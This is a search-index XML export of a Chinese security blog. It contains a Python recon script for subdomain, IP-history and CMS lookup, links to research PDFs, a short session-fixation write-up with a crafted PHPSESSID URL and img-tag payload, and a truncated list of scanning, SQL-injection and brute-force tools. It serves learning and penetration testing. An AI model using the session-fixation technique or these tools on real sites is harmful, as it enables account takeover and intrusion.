<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息收集辅助脚本(python3)</title>
      <link href="/2018/12/26/xin-xi-shou-ji-fu-zhu-jiao-ben-python3/"/>
      <url>/2018/12/26/xin-xi-shou-ji-fu-zhu-jiao-ben-python3/</url>
      
        <content type="html"><![CDATA[<h3 id="腳本介紹"><a href="#腳本介紹" class="headerlink" title="腳本介紹"></a>腳本介紹</h3><p>脚本是博主自己写的，博主承认自己写的很烂，超级烂，不过还是慢慢的完善吧~<br>目前可以有如下几点</p><ul><li>CMS识别</li><li>子域名获取</li><li>IP历史解析记录获取</li><li>多线程</li><li>输出人性化（输出的内容是<code>.html</code>，并且使用<code>bootstrap</code>框架写的虽然还是很丑但看的过去）</li><li>编不下去了。。。</li></ul><h3 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> timeurl <span class="token operator">=</span> input<span class="token punctuation">(</span> <span class="token string">'url(如baidu.com): '</span> <span class="token punctuation">)</span>head<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span><span class="token punctuation">}</span>ip <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> url <span class="token punctuation">)</span>domain_url <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>domain_url <span class="token operator">=</span> domain_url<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.'</span><span class="token operator">+</span>domain_url<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>domain <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}/domain.htm'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> domain_url <span class="token punctuation">)</span>t <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>html_file <span class="token operator">=</span> open<span class="token punctuation">(</span> url<span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>t<span class="token operator">+</span><span class="token string">'.html'</span><span class="token punctuation">,</span><span class="token string">'w'</span> <span class="token punctuation">)</span>html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token triple-quoted-string string">'''&lt;head>&lt;title>%s的扫描结果&lt;/title>&lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">&lt;script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js">&lt;/script>&lt;script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js">&lt;/script>&lt;style>pre{margin: 0 0 0px;}&lt;/style>&lt;/head>&lt;ul id="myTab" class="nav nav-tabs navbar-fixed-top navbar navbar-default">    &lt;li class="active">        &lt;a href="#ip" data-toggle="tab">             IP历史解析        &lt;/a>    &lt;/li>    &lt;li>&lt;a href="#cms" data-toggle="tab">CMS识别&lt;/a>&lt;/li>    &lt;li>&lt;a href="#domain" data-toggle="tab">子域名信息&lt;/a>&lt;/li>&lt;/ul>&lt;br>&lt;br>&lt;br>&lt;br>&lt;div id="myTabContent" class="tab-content">'''</span><span class="token operator">%</span>url <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">IP</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> ip    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="ip">'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ipc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            ip_html <span class="token operator">=</span> <span class="token string">'&lt;pre>{}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> ipc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> ip_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">CMS</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cms<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cms <span class="token operator">=</span> cms    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cms <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://whatweb.bugscaner.com/what/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'url'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>cms<span class="token punctuation">}</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> head<span class="token punctuation">)</span>        text <span class="token operator">=</span> cms<span class="token punctuation">.</span>text        Web_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Frameworks": "(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Programming_Languages <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Programming Languages":(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        JavaScript_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"JavaScript Frameworks": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        CMS <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"CMS": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Web_Server <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Servers": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">if</span> CMS<span class="token punctuation">:</span>            CMS <span class="token operator">=</span> CMS<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Programming_Languages<span class="token punctuation">:</span>            Programming_Languages <span class="token operator">=</span> Programming_Languages<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> JavaScript_Frameworks<span class="token punctuation">:</span>            JavaScript_Frameworks <span class="token operator">=</span> JavaScript_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Frameworks<span class="token punctuation">:</span>            Web_Frameworks <span class="token operator">=</span> Web_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Server<span class="token punctuation">:</span>            Web_Server <span class="token operator">=</span> Web_Server<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        html <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;div class="tab-pane fade" id="cms">        &lt;div class="table-responsive">        &lt;table class="table table-condensed">           &lt;tr>            &lt;th>web框架&lt;/th>            &lt;th>脚本版本&lt;/th>            &lt;th>JavaScript框架&lt;/th>            &lt;th>CMS框架&lt;/th>            &lt;th>web服务器&lt;/th>          &lt;/tr>          &lt;tr>            &lt;td>{0}&lt;/td>            &lt;td>{1}&lt;/td>            &lt;td>{2}&lt;/td>            &lt;td>{3}&lt;/td>            &lt;td>{4}&lt;/td>          &lt;/tr>        &lt;/table>        &lt;/div>        &lt;/div>        '''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>Web_Frameworks<span class="token punctuation">,</span>Programming_Languages<span class="token punctuation">,</span>JavaScript_Frameworks<span class="token punctuation">,</span>CMS<span class="token punctuation">,</span>Web_Server<span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> html <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">DOMAIN</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> domain<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>domain <span class="token operator">=</span> domain    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="domain"'</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">'&lt;br>'</span> <span class="token punctuation">)</span>            domainc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            domain_html <span class="token operator">=</span> <span class="token string">'&lt;pre>[{}]： {}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> num<span class="token punctuation">,</span>domainc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span>ip_cls <span class="token operator">=</span> IP<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>ip_html <span class="token operator">=</span> ip_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>cms_cls <span class="token operator">=</span> CMS<span class="token punctuation">(</span>url<span class="token punctuation">)</span>cms_html <span class="token operator">=</span> cms_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>domain_cls <span class="token operator">=</span> DOMAIN<span class="token punctuation">(</span> domain <span class="token punctuation">)</span>domain_html <span class="token operator">=</span> domain_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>后续会写一个将每个子域名的<code>title</code>跑出来，以及把每个子域名的<code>c</code>段跑出来以及历史<code>ip</code>的标题等~ 希望我有生之年写的出来吧 啊哈哈哈</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python3 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安天365安全研究资料分享</title>
      <link href="/2018/12/24/an-tian-365-an-quan-yan-jiu-zi-liao-fen-xiang/"/>
      <url>/2018/12/24/an-tian-365-an-quan-yan-jiu-zi-liao-fen-xiang/</url>
      
        <content type="html"><![CDATA[<h3 id="第一期"><a href="#第一期" class="headerlink" title="第一期"></a>第一期</h3><p><a href="http://static.zybuluo.com/1kbfree/9mo8fotfnvksr18aezqbi56o/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC1%E6%9C%9F-2017-04.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h3><p><a href="http://static.zybuluo.com/1kbfree/9zmznh67hr67q3499vzixdxz/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC2%E6%9C%9F-2017-05.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第三期"><a href="#第三期" class="headerlink" title="第三期"></a>第三期</h3><p><a href="http://static.zybuluo.com/1kbfree/0acfwlpgdvko40odp216yy6h/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC3%E6%9C%9F-2017-06.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第四期"><a href="#第四期" class="headerlink" title="第四期"></a>第四期</h3><p><a href="http://static.zybuluo.com/1kbfree/dee75yevf5r7l2huq38y5033/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC4%E6%9C%9F-2017-07.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h3><p><a href="http://static.zybuluo.com/1kbfree/vfrddr8rgb7d79ncl7k5aj9l/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC5%E6%9C%9F201708.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第六期"><a href="#第六期" class="headerlink" title="第六期"></a>第六期</h3><p><a href="http://static.zybuluo.com/1kbfree/tnh4nyev4qp2zdu7jqtk8pfs/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC6%E6%9C%9F201709.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第七期"><a href="#第七期" class="headerlink" title="第七期"></a>第七期</h3><p><a href="http://static.zybuluo.com/1kbfree/g6rh2ih0ynjmi7aldih9syu2/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC7%E6%9C%9F20171028.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第八期"><a href="#第八期" class="headerlink" title="第八期"></a>第八期</h3><p><a href="http://static.zybuluo.com/1kbfree/fna1eezud966bcnw59iqlvb1/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC8%E6%9C%9F20171128.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第九期"><a href="#第九期" class="headerlink" title="第九期"></a>第九期</h3><p><a href="http://static.zybuluo.com/1kbfree/3e7bib120fwlu998sxyjvwoh/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC9%E6%9C%9F20171228.pdf" target="_blank" rel="noopener">阅读地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资料分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie可控导致的漏洞</title>
      <link href="/2018/12/24/cookie-ke-kong-dao-zhi-de-lou-dong/"/>
      <url>/2018/12/24/cookie-ke-kong-dao-zhi-de-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、打开站点发现他有一个请求是这样的</p><p><img src="http://static.zybuluo.com/1kbfree/dr60uluzbcs2hex6kqt9bf1a/1.png" alt="1.png-200.5kB"></p><p>你可以操作<code>cookie</code>为任何值，那么好玩的来了~</p><p>首先假设<code>a</code>用户是受害者，然后我（攻击者）诱导<code>a</code>用户打开如下链接</p><pre><code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code></pre><p><img src="http://static.zybuluo.com/1kbfree/g4rdm8prblacgiadrd37qy6a/1.png" alt="1.png-155.1kB"></p><p>然后我（攻击者）在本地也打开</p><pre><code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code></pre><p><img src="http://static.zybuluo.com/1kbfree/ar9pro7zt5ppo9zve5d0n6gk/1.png" alt="1.png-200.9kB"></p><p>打开后就登录了，其实原理很简单，就是比如这里的系统是用<code>PHPSESSID</code>来验证用户信息的，但是这里<code>PHPSESSID</code>是可控的，所以攻击者可以把受害者的<code>PHPSESSID</code>修改为任何数，然后把自己的<code>PHPSESSID</code>也修改为受害者一样的值就可以登录他们的账号了，是不是很有意思。</p><h3 id="漏洞利用加深"><a href="#漏洞利用加深" class="headerlink" title="漏洞利用加深"></a>漏洞利用加深</h3><p>有一种方法可以让受害者莫名的中招，就比如<code>www.xxx.com</code>可以插入图片，那么我把图片地址改为<code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code>（也就是<code>&lt;img src=&#39;http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321&#39;&gt;</code>）然后用户一打开<code>www.xxx.com</code>就会在后台加载这个<code>url</code>然后他的<code>cookie</code>就变成了<code>123321</code>，然后攻击者去修改自己的<code>cookie</code>为<code>123321</code>就可以登录他们的账号了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gayhub上的工具集合</title>
      <link href="/2018/12/24/gayhub-shang-de-gong-ju-ji-he/"/>
      <url>/2018/12/24/gayhub-shang-de-gong-ju-ji-he/</url>
      
        <content type="html"><![CDATA[<h3 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h3><p><strong>Scanners Box</strong>是一个集合github平台上的安全行业从业者自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器，<strong>同时该仓库只收录各位网友自己编写的一般性开源扫描器，类似awvs、nmap、w3af等知名扫描工具不收录</strong>。</p><hr><h4 id="子域名枚举扫描器或爆破工具"><a href="#子域名枚举扫描器或爆破工具" class="headerlink" title="子域名枚举扫描器或爆破工具"></a>子域名枚举扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (lijiejie开发的一款使用广泛的子域名爆破枚举工具)</li><li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (猪猪侠开发的一款域名收集全面、精准的子域名枚举工具)</li><li><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举爆破工具以及地图位置标记)</li><li><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (提供web界面的在线子域名信息收集工具)</li><li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （高效精准的子域名爆破工具,同时也是扫描器中最常用的子域名API库)</li><li><a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">https://github.com/We5ter/GSDF</a> (基于谷歌SSL透明证书的子域名查询脚本)</li><li><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</li><li><a href="https://github.com/guelfoweb/knock" target="_blank" rel="noopener">https://github.com/guelfoweb/knock</a> (Knock子域名获取，可用于查找子域名接管漏洞)</li><li><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker" target="_blank" rel="noopener">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> （多方式收集目标子域名信息）</li><li><a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> (兄弟域名查询）</li><li><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a> (高效的子域名爆破工具)</li><li><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a> (一款高效的子域名爆破工具）</li><li><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a> (子域名枚举、探测工具。可用于子域名接管漏洞探测)</li><li><a href="https://github.com/evilsocket/dnssearch" target="_blank" rel="noopener">https://github.com/evilsocket/dnssearch</a> (一款子域名爆破工具)</li><li><a href="https://github.com/reconned/domained" target="_blank" rel="noopener">https://github.com/reconned/domained</a> (可用于子域名收集的一款工具）</li><li><a href="https://github.com/bit4woo/Teemo" target="_blank" rel="noopener">https://github.com/bit4woo/Teemo</a> (域名收集及枚举工具)</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> (邮箱、服务器信息收集及子域名枚举工具）</li><li><a href="https://github.com/swisskyrepo/Subdomino" target="_blank" rel="noopener">https://github.com/swisskyrepo/Subdomino</a> (子域名枚举，端口扫描，服务存活确认）</li><li><a href="https://github.com/nmalcolm/Inventus" target="_blank" rel="noopener">https://github.com/nmalcolm/Inventus</a> (通过爬虫实现的子域名收集工具）</li><li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a> (快速子域枚举工具)</li><li><a href="https://github.com/jonluca/Anubis" target="_blank" rel="noopener">https://github.com/jonluca/Anubis</a> （子域名枚举及信息搜集工具）</li><li><a href="https://github.com/n4xh4ck5/N4xD0rk" target="_blank" rel="noopener">https://github.com/n4xh4ck5/N4xD0rk</a> (子域名查询工具)</li><li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a> (一款高效的子域名爆破工具)</li><li><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a> (基于AsyncIO协程以及非重复字典的子域名爆破工具)</li><li><a href="https://github.com/giovanifss/Dumb" target="_blank" rel="noopener">https://github.com/giovanifss/Dumb</a> (快速而灵活的子域名爆破工具)</li><li><a href="https://github.com/UnaPibaGeek/ctfr" target="_blank" rel="noopener">https://github.com/UnaPibaGeek/ctfr</a> (通过域名透明证书记录获取子域名)</li><li><a href="https://github.com/caffix/amass" target="_blank" rel="noopener">https://github.com/caffix/amass</a> (Go语言开发的子域名枚举工具)</li><li><a href="https://github.com/Ice3man543/subfinder" target="_blank" rel="noopener">https://github.com/Ice3man543/subfinder</a> (继承于sublist3r项目的模块化体系结构，一个强劲的子域名枚举工具)</li></ul><h4 id="数据库类漏洞扫描器或爆破工具"><a href="#数据库类漏洞扫描器或爆破工具" class="headerlink" title="数据库类漏洞扫描器或爆破工具"></a>数据库类漏洞扫描器或爆破工具</h4><ul><li><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</li><li><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</li><li><a href="https://github.com/LoRexxar/Feigong" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong</a> （针对各种情况自由变化的MySQL注入脚本）</li><li><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</li><li><a href="https://github.com/Neohapsis/bbqsql" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql</a> （SQL盲注利用框架）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> （攻击SQLSERVER的Powershell脚本框架）</li><li><a href="https://github.com/WhitewidowScanner/whitewidow" target="_blank" rel="noopener">https://github.com/WhitewidowScanner/whitewidow</a> (一款数据库扫描器)</li><li><a href="https://github.com/stampery/mongoaudit" target="_blank" rel="noopener">https://github.com/stampery/mongoaudit</a> (MongoDB审计及渗透工具）</li><li><a href="https://github.com/torque59/Nosql-Exploitation-Framework" target="_blank" rel="noopener">https://github.com/torque59/Nosql-Exploitation-Framework</a> (NoSQL扫描/爆破工具）</li><li><a href="https://github.com/missDronio/blindy" target="_blank" rel="noopener">https://github.com/missDronio/blindy</a> (MySQL盲注爆破工具）</li><li><a href="https://github.com/fengxuangit/Fox-scan" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan</a> (基于SQLMAP的主动和被动资源发现的漏洞扫描工具）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> (用于SQL Server审计的powershell脚本）</li><li><a href="https://github.com/JohnTroony/Blisqy" target="_blank" rel="noopener">https://github.com/JohnTroony/Blisqy</a> （用于http header中的时间盲注爆破工具，仅针对MySQL/MariaDB）</li><li><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a> (Java 编写的SQL注入工具)</li><li><a href="https://github.com/Hadesy2k/sqliv" target="_blank" rel="noopener">https://github.com/Hadesy2k/sqliv</a> (基于搜索引擎的批量SQL注入漏洞扫描器）</li><li><a href="https://github.com/s0md3v/sqlmate" target="_blank" rel="noopener">https://github.com/s0md3v/sqlmate</a> (在sqlmap基础上增加了目录扫描、hash爆破等功能)</li><li><a href="https://github.com/m8r0wn/enumdb" target="_blank" rel="noopener">https://github.com/m8r0wn/enumdb</a> (MySQL以及MSSQL爆破脱裤工具）</li><li><a href="https://github.com/9tail123/wooscan" target="_blank" rel="noopener">https://github.com/9tail123/wooscan</a> (批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)</li></ul><h4 id="弱口令-弱用户名扫描器或爆破工具"><a href="#弱口令-弱用户名扫描器或爆破工具" class="headerlink" title="弱口令/弱用户名扫描器或爆破工具"></a>弱口令/弱用户名扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</li><li><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> （对各类服务进行弱口令检测的脚本)</li><li><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</li><li><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （Go写的协程版的ssh\redis\mongodb弱口令破解工具）</li><li><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a> 